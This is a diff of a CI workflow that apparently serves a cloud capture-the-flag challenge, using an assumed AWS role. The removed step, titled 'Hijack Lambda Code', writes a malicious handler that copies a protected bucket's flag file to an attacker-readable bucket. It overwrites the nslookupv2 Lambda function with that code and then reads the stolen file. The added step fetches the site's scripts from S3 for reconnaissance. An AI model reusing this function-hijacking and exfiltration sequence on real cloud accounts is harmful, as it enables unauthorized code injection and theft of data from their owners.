@@ -17,37 +17,8 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Hijack Lambda Code
+      - name: Find Website API Endpoint
         run: |
-          echo "=== Creating Malicious Code ==="
-          cat << 'INNER_EOF' > lambda_function.py
-          import boto3
-          import logging
-
-          def lambda_handler(event, context):
-              s3 = boto3.client('s3')
-              try:
-                  # העתקת הקובץ מהבאקט המאובטח לבאקט הנגיש לנו
-                  s3.copy_object(
-                      Bucket='platform-bucket-009661764077-us-east-1',
-                      Key='stolen_flag.txt',
-                      CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}
-                  )
-                  return {"status": "success"}
-              except Exception as e:
-                  return {"status": "error", "message": str(e)}
-          INNER_EOF
-          
-          zip lambda_update.zip lambda_function.py
-          
-          echo "=== Injecting Code Into nslookupv2 ==="
-          aws lambda update-function-code \
-            --function-name nslookupv2 \
-            --zip-file fileb://lambda_update.zip
-            
-          echo "=== Waiting for Lambda Execution/Trigger ==="
-          sleep 10
-          
-          echo "=== Checking If Flag Was Exfiltrated ==="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/stolen_flag.txt - || true
+          echo "=== Reading Website JavaScript to find API Endpoint ==="
+          aws s3 cp s3://site781fe43f26b9eba3/js/scripts.js - || true
+          aws s3 cp s3://site781fe43f26b9eba3/index.html - || true
